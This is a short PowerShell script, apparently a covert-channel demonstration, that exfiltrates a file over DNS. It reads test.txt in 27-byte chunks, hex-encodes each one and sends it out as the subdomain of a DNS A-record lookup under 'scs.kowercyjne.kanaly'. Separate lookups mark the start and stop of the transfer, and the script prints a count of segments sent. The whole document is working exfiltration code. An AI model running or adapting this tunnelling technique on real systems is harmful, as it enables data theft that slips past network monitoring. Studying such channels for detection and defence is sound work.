$fname = "test.txt";
If (Test-Path $fname) {
    $i=0;
    Resolve-DnsName -Type A -DnsOnly -QuickTimeout -ErrorAction 'silentlycontinue' start.scs.kowercyjne.kanaly
    Get-Content -AsByteStream -ReadCount 27 -TotalCount -1 $fname | ForEach-Object {
        $paddedhex = $text = $null;
        $bytes = $_;
        foreach ($byte in $bytes) {
            $byteinhex = [String]::Format("{0:X}", $byte);
            $paddedhex += $byteinhex.PadLeft(2,"0")
        }
        $req=$paddedhex+"."+$i+".scs.kowercyjne.kanaly";
        $i++;
        $req;
        Resolve-DnsName -Type A -DnsOnly -QuickTimeout $req -ErrorAction 'silentlycontinue'; 
    }
    Resolve-DnsName -Type A -DnsOnly -QuickTimeout -ErrorAction 'silentlycontinue' stop.scs.kowercyjne.kanaly;
    'Segments sent: '+$i
}
else {
    Write-Output "File does not exist"
}
